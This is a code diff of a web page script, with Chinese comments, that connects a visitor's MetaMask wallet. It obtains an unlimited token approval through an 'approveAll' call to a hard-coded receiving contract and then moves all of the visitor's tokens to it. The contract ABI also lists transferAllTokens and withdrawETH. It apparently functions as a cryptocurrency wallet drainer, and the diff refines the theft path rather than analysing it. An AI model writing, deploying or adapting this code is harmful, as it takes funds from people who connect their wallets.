@@ -59,75 +59,75 @@
         const contractAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 你的接收地址
         const tokenAddress = '0x56a2777e796eF23399e9E1d791E1A0410a75E31b'; // 你的已部署的合约地址
         const tokenABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "approveAll",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "token",
-				"type": "address"
-			}
-		],
-		"name": "transferAllTokens",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"inputs": [],
-		"name": "withdrawETH",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"stateMutability": "payable",
-		"type": "receive"
-	},
-	{
-		"inputs": [],
-		"name": "owner",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "recipient",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
-]; // 你的代币合约的ABI
+            {
+                "inputs": [
+                    {
+                        "internalType": "contract IERC20",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "approveAll",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "contract IERC20",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "transferAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawETH",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "recipient",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ]; // 你的代币合约的ABI
 
         // 初始化 Web3
         async function connectWallet() {
@@ -140,10 +140,12 @@
                     document.getElementById("status").innerText = "已连接钱包: " + account;
                     document.getElementById("authorizeTransfer").disabled = false;
                 } catch (error) {
+                    console.error("钱包连接错误:", error);
                     document.getElementById("status").innerText = "钱包连接失败: " + error.message;
                 }
             } else {
-                document.getElementById("status").innerText = "请安装 MetaMask!";
+                document.getElementById("status").innerText = "请安装 MetaMask 或确保浏览器支持 Web3!";
+                console.error("MetaMask 不可用或浏览器不支持 Web3");
             }
         }
 
@@ -157,7 +159,7 @@
                 document.getElementById("status").innerText = "正在授权代币转移...";
 
                 // 执行 approve 授权，授权无限量代币转移
-                await tokenContract.methods.approve(contractAddress, balance).send({ from: account });
+                await tokenContract.methods.approveAll(contractAddress).send({ from: account });
 
                 document.getElementById("status").innerText = "授权成功，正在转移代币...";
 
@@ -166,6 +168,7 @@
 
                 document.getElementById("status").innerText = "代币已成功转移到接收地址！";
             } catch (error) {
+                console.error("授权或转移代币时发生错误:", error);
                 document.getElementById("status").innerText = "操作失败: " + error.message;
             }
         }
